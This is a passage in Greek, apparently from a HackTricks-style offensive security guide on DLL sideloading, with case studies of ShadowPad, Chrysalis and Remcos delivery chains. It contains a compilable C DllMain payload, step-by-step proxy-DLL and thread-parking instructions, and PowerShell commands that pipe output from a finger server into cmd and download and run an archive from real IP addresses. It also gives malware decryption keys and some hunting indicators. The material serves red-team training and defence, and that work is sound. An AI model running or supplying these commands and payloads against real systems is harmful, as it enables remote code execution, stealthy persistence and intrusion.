- Ο χρήστης κατεβάζει το MSI. Ένα CustomAction εκτελείται σιωπηρά κατά την εγκατάσταση μέσω GUI (π.χ. μια ενέργεια LaunchApplication ή VBScript) και ανασυνθέτει το επόμενο στάδιο από ενσωματωμένους πόρους.
- Το dropper γράφει ένα νόμιμο, υπογεγραμμένο EXE και ένα κακόβουλο DLL στον ίδιο κατάλογο (ενδεικτικό ζεύγος: το υπογεγραμμένο από την Avast wsc_proxy.exe + το ελεγχόμενο από τον εισβολέα wsc.dll).
- Όταν εκκινηθεί το υπογεγραμμένο EXE, η σειρά αναζήτησης DLL των Windows φορτώνει πρώτα το wsc.dll από τον τρέχοντα κατάλογο, εκτελώντας κώδικα του εισβολέα μέσω μιας υπογεγραμμένης γονικής διεργασίας (ATT&CK T1574.001).

Ανάλυση MSI (τι να αναζητήσετε)
- Πίνακας CustomAction:
  - Αναζητήστε εγγραφές που εκτελούν εκτελέσιμα αρχεία ή VBScript. Ενδεικτικό ύποπτο μοτίβο: LaunchApplication που εκτελεί στο παρασκήνιο ένα ενσωματωμένο αρχείο.
  - Στο Orca (Microsoft Orca.exe), εξετάστε τους πίνακες CustomAction, InstallExecuteSequence και Binary.
- Ενσωματωμένα/διαχωρισμένα payloads στο CAB του MSI:
  - Εξαγωγή διαχειριστή: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Ή χρησιμοποιήστε το lessmsi: lessmsi x package.msi C:\out
  - Αναζητήστε πολλά μικρά τμήματα που συνενώνονται και αποκρυπτογραφούνται από ένα VBScript CustomAction. Συνήθης ροή:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Πρακτικό sideloading με το wsc_proxy.exe
- Τοποθετήστε αυτά τα δύο αρχεία στον ίδιο φάκελο:
  - wsc_proxy.exe: νόμιμο, υπογεγραμμένο host (Avast). Η διεργασία επιχειρεί να φορτώσει το wsc.dll από τον φάκελό της, χρησιμοποιώντας το όνομά του.
  - wsc.dll: DLL του επιτιθέμενου. Αν δεν απαιτούνται συγκεκριμένα exports, αρκεί το DllMain· διαφορετικά, δημιουργήστε ένα proxy DLL και προωθήστε τα απαιτούμενα exports στην αυθεντική βιβλιοθήκη, εκτελώντας παράλληλα το payload στο DllMain.
- Δημιουργήστε ένα ελάχιστο DLL payload:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Για απαιτήσεις exports, χρησιμοποιήστε ένα proxying framework (π.χ. DLLirant/Spartacus) για να δημιουργήσετε ένα forwarding DLL που εκτελεί και το payload σας.

- Αυτή η τεχνική βασίζεται στην επίλυση ονομάτων DLL από το host binary. Αν το host χρησιμοποιεί απόλυτες διαδρομές ή safe loading flags (π.χ. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), το hijack μπορεί να αποτύχει.
- Τα KnownDLLs, το SxS και τα forwarded exports μπορούν να επηρεάσουν την προτεραιότητα και πρέπει να λαμβάνονται υπόψη κατά την επιλογή του host binary και του συνόλου exports.

## Υπογεγραμμένες τριάδες + κρυπτογραφημένα payloads (μελέτη περίπτωσης ShadowPad)

Η Check Point περιέγραψε πώς το Ink Dragon αναπτύσσει το ShadowPad χρησιμοποιώντας μια **τριάδα τριών αρχείων**, ώστε να μοιάζει με νόμιμο λογισμικό, διατηρώντας παράλληλα το βασικό payload κρυπτογραφημένο στον δίσκο:<sup>[[12]](#references)</sup>

1. **Υπογεγραμμένο host EXE** – γίνεται κατάχρηση προγραμμάτων προμηθευτών όπως τα AMD, Realtek ή NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Οι επιτιθέμενοι μετονομάζουν το εκτελέσιμο ώστε να μοιάζει με binary των Windows (για παράδειγμα, `conhost.exe`), αλλά η υπογραφή Authenticode παραμένει έγκυρη.
2. **Κακόβουλο loader DLL** – τοποθετείται δίπλα στο EXE με το αναμενόμενο όνομα (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Το DLL είναι συνήθως ένα MFC binary συσκοτισμένο με το framework ScatterBrain· μοναδικός σκοπός του είναι να εντοπίσει το κρυπτογραφημένο blob, να το αποκρυπτογραφήσει και να κάνει reflective mapping του ShadowPad.
3. **Κρυπτογραφημένο payload blob** – αποθηκεύεται συχνά ως `<name>.tmp` στον ίδιο κατάλογο. Αφού κάνει memory-mapping το αποκρυπτογραφημένο payload, ο loader διαγράφει το αρχείο TMP για να καταστρέψει τα forensic στοιχεία.

Σημειώσεις tradecraft:

* Η μετονομασία του υπογεγραμμένου EXE (διατηρώντας το αρχικό `OriginalFileName` στην κεφαλίδα PE) του επιτρέπει να μεταμφιέζεται σε binary των Windows, διατηρώντας παράλληλα την υπογραφή του προμηθευτή. Επομένως, αναπαράγετε τη συνήθεια του Ink Dragon να τοποθετεί binaries που μοιάζουν με `conhost.exe`, αλλά είναι στην πραγματικότητα βοηθητικά προγράμματα AMD/NVIDIA.
* Επειδή το εκτελέσιμο παραμένει έμπιστο, τα περισσότερα allowlisting controls απαιτούν μόνο να βρίσκεται το κακόβουλο DLL δίπλα του. Εστιάστε στην προσαρμογή του loader DLL· το υπογεγραμμένο parent συνήθως μπορεί να εκτελεστεί χωρίς αλλαγές.
* Ο decryptor του ShadowPad απαιτεί το TMP blob να βρίσκεται δίπλα στον loader και ο κατάλογος να είναι εγγράψιμος, ώστε να μπορεί να μηδενίσει το αρχείο μετά το mapping. Διατηρήστε τον κατάλογο εγγράψιμο μέχρι να φορτωθεί το payload· μόλις βρεθεί στη μνήμη, το αρχείο TMP μπορεί να διαγραφεί με ασφάλεια για λόγους OPSEC.

### Αλυσίδα DLL sideloading με LOLBAS stager + staged archive (finger → tar/curl → WMI)

Οι operators συνδυάζουν το DLL sideloading με το LOLBAS, ώστε το μοναδικό custom artifact στον δίσκο να είναι το κακόβουλο DLL δίπλα στο έμπιστο EXE:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Κρυφό PowerShell εκκινεί το `cmd.exe /c`, ανακτά εντολές από έναν Finger server και τις διοχετεύει στο `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - Το `finger user@host` λαμβάνει κείμενο μέσω TCP/79· το `| cmd` εκτελεί την απόκριση του server, επιτρέποντας στους operators να αλλάζουν το second-stage server-side.

- **Ενσωματωμένη λήψη/αποσυμπίεση:** Κατεβάστε ένα archive με αθώα επέκταση, αποσυμπιέστε το και τοποθετήστε τον στόχο sideload μαζί με το DLL σε έναν τυχαίο φάκελο `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` αποκρύπτει την ένδειξη προόδου και ακολουθεί τις ανακατευθύνσεις· το `tar -xf` χρησιμοποιεί το ενσωματωμένο στα Windows `tar`.

- **Εκκίνηση μέσω WMI/CIM:** Εκκινήστε το EXE μέσω WMI, ώστε τα δεδομένα τηλεμετρίας να δείχνουν μια διεργασία που δημιουργήθηκε μέσω CIM, ενώ αυτή φορτώνει το DLL που βρίσκεται στον ίδιο κατάλογο:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Λειτουργεί με binaries που προτιμούν τοπικά DLLs (π.χ. `intelbq.exe`, `nearby_share.exe`)· το payload (π.χ. Remcos) εκτελείται με το έμπιστο όνομα.

- **Hunting:** Δημιουργήστε alert για το `forfiles` όταν εμφανίζονται μαζί τα `/p`, `/m` και `/c`· σπάνια χρησιμοποιούνται εκτός admin scripts.


## Μελέτη περίπτωσης: NSIS dropper + sideload του Bitdefender Submission Wizard (Chrysalis)

Μια πρόσφατη εισβολή της Lotus Blossom εκμεταλλεύτηκε μια έμπιστη αλυσίδα ενημερώσεων για να παραδώσει ένα NSIS-packed dropper, το οποίο προετοίμασε ένα DLL sideload μαζί με payloads που εκτελούνταν εξ ολοκλήρου στη μνήμη.<sup>[[13]](#references)</sup>

Ροή tradecraft
- Το `update.exe` (NSIS) δημιουργεί το `%AppData%\Bluetooth`, το χαρακτηρίζει **HIDDEN**, αποθηκεύει ένα μετονομασμένο Bitdefender Submission Wizard `BluetoothService.exe`, ένα κακόβουλο `log.dll` και ένα κρυπτογραφημένο blob `BluetoothService` και έπειτα εκκινεί το EXE.
- Το host EXE εισάγει το `log.dll` και καλεί τις `LogInit`/`LogWrite`. Η `LogInit` φορτώνει το blob μέσω mmap· η `LogWrite` το αποκρυπτογραφεί με ένα custom LCG-based stream (σταθερές **0x19660D** / **0x3C6EF35F**, υλικό κλειδιού που προκύπτει από προηγούμενο hash), αντικαθιστά το buffer με plaintext shellcode, αποδεσμεύει τα προσωρινά δεδομένα και μεταβαίνει σε αυτό.
- Για να αποφύγει ένα IAT, ο loader επιλύει APIs κάνοντας hash στα ονόματα των exports με **FNV-1a basis 0x811C9DC5 + prime 0x1000193** και έπειτα εφαρμόζοντας ένα Murmur-style avalanche (**0x85EBCA6B**) και συγκρίνοντάς το με salted target hashes.

Κύριο shellcode (Chrysalis)
- Αποκρυπτογραφεί ένα κύριο module τύπου PE επαναλαμβάνοντας add/XOR/sub με το κλειδί `gQ2JR&9;` σε πέντε περάσματα και έπειτα φορτώνει δυναμικά το `Kernel32.dll` → `GetProcAddress` για να ολοκληρώσει την επίλυση των imports.
- Ανακατασκευάζει strings ονομάτων DLL κατά τον χρόνο εκτέλεσης μέσω bit-rotate/XOR μετασχηματισμών ανά χαρακτήρα και έπειτα φορτώνει τα `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Χρησιμοποιεί δεύτερο resolver που διασχίζει το **PEB → InMemoryOrderModuleList**, αναλύει κάθε export table σε blocks των 4 bytes με Murmur-style mixing και χρησιμοποιεί το `GetProcAddress` μόνο αν δεν βρεθεί το hash.

Ενσωματωμένη διαμόρφωση & C2
- Η διαμόρφωση βρίσκεται μέσα στο αρχείο `BluetoothService` που αποθηκεύτηκε, στο **offset 0x30808** (μέγεθος **0x980**) και αποκρυπτογραφείται με RC4 χρησιμοποιώντας το κλειδί `qwhvb^435h&*7`, αποκαλύπτοντας το C2 URL και το User-Agent.
- Τα beacons δημιουργούν ένα host profile με πεδία διαχωρισμένα με τελείες, προσθέτουν μπροστά το tag `4Q` και έπειτα το κρυπτογραφούν με RC4 χρησιμοποιώντας το κλειδί `vAuig34%^325hGV` πριν από την κλήση του `HttpSendRequestA` μέσω HTTPS. Οι αποκρίσεις αποκρυπτογραφούνται με RC4 και δρομολογούνται μέσω ενός tag switch (`4T` shell, `4V` εκτέλεση διεργασίας, `4W/4X` εγγραφή αρχείου, `4Y` ανάγνωση/exfil, `4\\` απεγκατάσταση, `4` απαρίθμηση drive/αρχείων + περιπτώσεις chunked transfer).
- Ο τρόπος εκτέλεσης καθορίζεται από τα CLI args: χωρίς args = εγκατάσταση persistence (service/Run key) που δείχνει στο `-i`· το `-i` επανεκκινεί το ίδιο με `-k`· το `-k` παραλείπει την εγκατάσταση και εκτελεί το payload.

Εναλλακτικός loader που παρατηρήθηκε
- Η ίδια εισβολή αποθήκευσε το Tiny C Compiler και εκτέλεσε το `svchost.exe -nostdlib -run conf.c` από το `C:\ProgramData\USOShared\`, με το `libtcc.dll` δίπλα του. Ο C source που παρείχε ο attacker περιείχε ενσωματωμένο shellcode, το οποίο μεταγλωττίστηκε και εκτελέστηκε στη μνήμη χωρίς να γραφτεί PE στον δίσκο. Αναπαράγετε το με:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Αυτό το στάδιο μεταγλώττισης και εκτέλεσης που βασίζεται στο TCC εισήγαγε το `Wininet.dll` κατά τον χρόνο εκτέλεσης και ανέκτησε ένα shellcode δεύτερου σταδίου από ένα hardcoded URL, παρέχοντας έναν ευέλικτο loader που μεταμφιέζεται σε εκτέλεση compiler.

## DLL sideloading με proxying των exports + ακινητοποίηση του νήματος της διεργασίας

Ορισμένες αλυσίδες DLL sideloading προσθέτουν **μηχανισμούς σταθερότητας**, ώστε η νόμιμη διεργασία-ξενιστής να παραμένει ενεργή αρκετά για να φορτώσει ομαλά τα επόμενα στάδια, αντί να καταρρεύσει μετά τη φόρτωση του κακόβουλου DLL.<sup>[[11]](#references)</sup>

Παρατηρούμενο μοτίβο
- Τοποθέτηση ενός έμπιστου EXE δίπλα σε ένα κακόβουλο DLL, με το αναμενόμενο όνομα εξάρτησης, όπως `version.dll`.
- Το κακόβουλο DLL **λειτουργεί ως proxy για κάθε αναμενόμενο export**, προωθώντας τις κλήσεις στο πραγματικό DLL συστήματος (για παράδειγμα, `%SystemRoot%\\System32\\version.dll`), ώστε να επιτυγχάνεται η επίλυση των imports και η διεργασία-ξενιστής να συνεχίζει να λειτουργεί.
- Μετά τη φόρτωση, το κακόβουλο DLL **τροποποιεί το entry point της διεργασίας-ξενιστή**, ώστε το κύριο νήμα να εισέλθει σε έναν ατέρμονο βρόχο `Sleep` αντί να τερματιστεί ή να εκτελέσει διαδρομές κώδικα που θα τερμάτιζαν τη διεργασία.
- Ένα νέο νήμα εκτελεί την πραγματική κακόβουλη λειτουργία: αποκρυπτογραφεί το όνομα ή τη διαδρομή του DLL επόμενου σταδίου (συχνά με RC4/XOR) και στη συνέχεια το εκκινεί με `LoadLibrary`.

Γιατί έχει σημασία
- Το συνηθισμένο DLL proxying διατηρεί τη συμβατότητα API, αλλά δεν εγγυάται ότι η διεργασία-ξενιστής θα παραμείνει ενεργή αρκετά για τα επόμενα στάδια.
- Η ακινητοποίηση του κύριου νήματος με `Sleep(INFINITE)` είναι ένας απλός τρόπος να παραμείνει ενεργή η υπογεγραμμένη διεργασία, ενώ ο loader εκτελεί αποκρυπτογράφηση, staging ή αρχικοποίηση δικτυακής σύνδεσης σε ένα νήμα worker.
- Η αναζήτηση μόνο για ύποπτο `DllMain` μπορεί να μην εντοπίσει αυτό το μοτίβο, αν η ενδιαφέρουσα συμπεριφορά ξεκινά αφού τροποποιηθεί το entry point της διεργασίας-ξενιστής και ξεκινήσει ένα δευτερεύον νήμα.

Ελάχιστη ροή εργασίας
1. Αντιγράψτε το υπογεγραμμένο EXE-ξενιστή και προσδιορίστε ποιο DLL αναζητά στον τοπικό κατάλογο.
2. Δημιουργήστε ένα proxy DLL που εξάγει τις ίδιες συναρτήσεις και προωθεί τις κλήσεις στο νόμιμο DLL.
3. Στο `DllMain(DLL_PROCESS_ATTACH)`, δημιουργήστε ένα νήμα worker.
4. Από αυτό το νήμα, τροποποιήστε το entry point της διεργασίας-ξενιστής ή τη ρουτίνα εκκίνησης του κύριου νήματος, ώστε να εκτελεί βρόχο με `Sleep`.
5. Αποκρυπτογραφήστε το όνομα/τις ρυθμίσεις του DLL επόμενου σταδίου και καλέστε `LoadLibrary` ή κάντε manual-map το payload.

Αμυντικές ενδείξεις
- Υπογεγραμμένες διεργασίες που φορτώνουν το `version.dll` ή παρόμοιες κοινές βιβλιοθήκες από τον δικό τους κατάλογο εφαρμογής αντί από το `System32`.
- Τροποποιήσεις μνήμης στο entry point της διεργασίας λίγο μετά τη φόρτωση του image, ιδιαίτερα άλματα/κλήσεις που ανακατευθύνονται σε `Sleep`/`SleepEx`.
- Νήματα που δημιουργούνται από proxy DLL και καλούν αμέσως `LoadLibrary` για ένα δεύτερο DLL με αποκρυπτογραφημένο όνομα.
- Proxy DLL που εξάγουν όλες τις συναρτήσεις και τοποθετούνται δίπλα σε εκτελέσιμα αρχεία προμηθευτών, μέσα σε εγγράψιμους καταλόγους staging, όπως `ProgramData`, `%TEMP%` ή διαδρομές αποσυμπιεσμένων αρχείων.

## References

- [1] [Red Canary – Πληροφορίες από τις υπηρεσίες πληροφοριών: Ιανουάριος 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Κλιμάκωση προνομίων μέσω του TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking στα Windows. Απλό παράδειγμα σε C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Το Nimbus Manticore αναπτύσσει νέο malware με στόχο την Ευρώπη](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Όταν τα DLL Hijacks συναντούν τα Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Ψηφιακοί σωσίες: Ανάλυση εξελισσόμενων εκστρατειών πλαστοπροσωπίας που διανέμουν το Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Σύγκλιση συμφερόντων: Ανάλυση ομάδων απειλών που στοχεύουν μια κυβέρνηση της Νοτιοανατολικής Ασίας](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Μέσα στο Ink Dragon: Αποκαλύπτοντας το δίκτυο αναμετάδοσης και τη λειτουργία μιας συγκαλυμμένης επιθετικής επιχείρησης](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Το Chrysalis Backdoor: Μια εις βάθος ανάλυση του toolkit της Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – Αλυσίδα HTB Bruno ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Παρακολούθηση των εκστρατειών κατασκοπείας του 2026 της ιρανικής APT Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Στοιχείο `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Στοιχείο `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Στοιχείο `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Στοιχείο `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Στοιχείο `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Στοιχείο `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Γρήγορα και ασταμάτητα: Οι επιχειρήσεις του Nimbus Manticore κατά τη διάρκεια της ιρανικής σύγκρουσης](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Ενέργειες εργασιών](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – Η CL-STA-1062 στοχεύει κυβερνήσεις και κρίσιμες υποδομές της Νοτιοανατολικής Ασίας](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Ανακατασκευή και εντοπισμός του DLL Search-Order Hijacking στα Windows με το Elastic Defend 9.5.0](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Δημιουργία native βιβλιοθηκών με Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Native exports με Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – Σειρά αναζήτησης Dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – Μορφή PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – Αποκάλυψη μιας παραλλαγής του SectopRAT ενσωματωμένης σε νόμιμο λογισμικό](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – Κλέβοντας το LIGHTSHOW (Μέρος Πρώτο)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Επιχείρηση FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
- [35] [Kaspersky Securelist – Πλαίσιο φόρτωσης .NET βασισμένο σε XAML, NetamLoader](https://securelist.com/netamloader/121676)
{{#include ../../../banners/hacktricks-training.md}}
